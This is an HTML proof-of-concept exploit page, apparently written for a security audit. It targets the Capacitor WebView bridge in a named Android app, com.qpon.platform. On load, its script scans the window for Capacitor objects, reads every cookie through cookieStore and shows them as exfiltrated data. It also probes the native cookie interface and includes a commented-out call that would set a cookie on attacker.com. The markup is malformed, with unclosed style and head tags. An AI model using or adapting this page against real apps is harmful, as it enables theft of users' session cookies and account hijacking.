<!DOCTYPE html>
<html>
<head>
    <title>Capacitor WebView Exploit PoC</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff41; padding: 20px; line-height: 1.4; }
        .header { color: #ff0055; border-bottom: 2px solid #ff0055; margin-bottom: 20px; }
        .found { color: #fff; background: #ff0055; padding: 2px 5px; border-radius: 3px; }
        .method { color: #00bcff; margin-left: 20px; }
        #cookie-dump { background: #1a1a1a; padding: 15px; border: 1px dashed #00ff41; margin-top: 20px; word-break: break-all; }

<body>

    <h1 class="header">EXPLOIT ACTIVE: CAPACITOR BRIDGE</h1>
    
    <div>
        <strong>Target App:</strong> com.qpon.platform<br>
        <strong>Status:</strong> <span id="status">Scanning for Bridges...</span>
    </div>

    <div id="cookie-dump">
        <strong>Exfiltrated Data:</strong><br>
        <span id="data-output">Waiting for command...</span>
    </div>

    <button onclick="dumpCookies()">Force Cookie Dump</button>
    <button onclick="testNativeBridge()">Test Native Bridge</button>

    <script>
        const output = document.getElementById('data-output');
        const status = document.getElementById('status');

        // 1. ATTEMPT TO DUMP COOKIES IMMEDIATELY
        async function dumpCookies() {
            try {
                if (window.cookieStore) {
                    status.innerText = "Accessing CookieStore...";
                    const allCookies = await window.cookieStore.getAll();
                    
                    if (allCookies.length > 0) {
                        output.innerHTML = "<strong>SUCCESS! Total Cookies: " + allCookies.length + "</strong><br><br>";
                        output.innerHTML += JSON.stringify(allCookies, null, 2);
                        alert("POC SUCCESS: Stolen " + allCookies.length + " cookies!");
                    } else {
                        output.innerHTML = "CookieStore found, but returned 0 cookies (secure flag or empty).";
                    }
                } else {
                    output.innerHTML = "Standard cookieStore not found. Trying Native Bridge...";
                }
            } catch (e) {
                output.innerHTML = "Error accessing CookieStore: " + e.message;
            }
        }

        // 2. TEST NATIVE CAPACITOR INTERFACE
        function testNativeBridge() {
            try {
                if (window.CapacitorCookiesAndroidInterface) {
                    const enabled = window.CapacitorCookiesAndroidInterface.isEnabled();
                    alert("Native Bridge Response (isEnabled): " + enabled);
                    
                    // Attempt to set a cookie to prove write access
                    // window.CapacitorCookiesAndroidInterface.setCookie("https://attacker.com", "pwned=true");
                } else {
                    alert("Capacitor Native Interface not found in this context.");
                }
            } catch (e) {
                alert("Native Bridge Error: " + e.message);
            }
        }

        // 3. ENUMERATION LOGIC (Keep this to show the auditor the attack surface)
        function scan() {
            const standard = ['window', 'document', 'console', 'chrome', 'performance', 'location', 'navigator', 'external'];
            for (let prop in window) {
                if (typeof window[prop] === 'object' && window[prop] !== null && !standard.includes(prop)) {
                    console.log("Found: " + prop);
                    // If we find the Capacitor core, update status
                    if(prop.includes("Capacitor")) status.innerHTML = "<span class='found'>CAPACITOR BRIDGE DETECTED</span>";
                }
            }
        }

        // Run on load
        setTimeout(() => {
            scan();
            dumpCookies();
        }, 1000);
    </script>
